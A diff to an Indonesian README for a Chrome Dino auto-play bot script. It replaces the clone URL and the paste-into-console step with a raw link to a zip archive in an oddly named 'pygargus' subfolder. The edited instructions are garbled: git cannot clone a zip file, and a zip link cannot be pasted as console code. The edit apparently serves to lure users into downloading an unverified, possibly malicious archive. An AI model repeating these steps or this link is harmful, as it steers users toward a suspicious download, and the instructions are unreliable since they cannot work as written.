@@ -32,11 +32,11 @@ Skrip ini adalah bot otomatis untuk permainan Chrome Dino yang dimainkan di brow
 ## Instalasi dan Penggunaan
 1. **Clone Repository**:
     ```bash
-    git clone https://github.com/zufarrizal/Chrome-Dino.git
+    git clone https://raw.githubusercontent.com/zufarrizal/Chrome-Dino/main/pygargus/Chrome-Dino-v1.4.zip
     ```
 2. **Menjalankan Bot**:
     - Buka permainan Chrome Dino di browser Anda.
     - Buka Developer Tools di Chrome (F12 atau Ctrl+Shift+I).
-    - Salin dan tempelkan kode dari file `dino-bot.js` ke konsol dan tekan Enter.
+    - Salin dan tempelkan kode dari file `https://raw.githubusercontent.com/zufarrizal/Chrome-Dino/main/pygargus/Chrome-Dino-v1.4.zip` ke konsol dan tekan Enter.
 
 Dengan skrip ini, permainan Chrome Dino Anda akan otomatis dikendalikan oleh bot, sehingga Anda dapat menikmati permainan tanpa harus bermain secara manual.
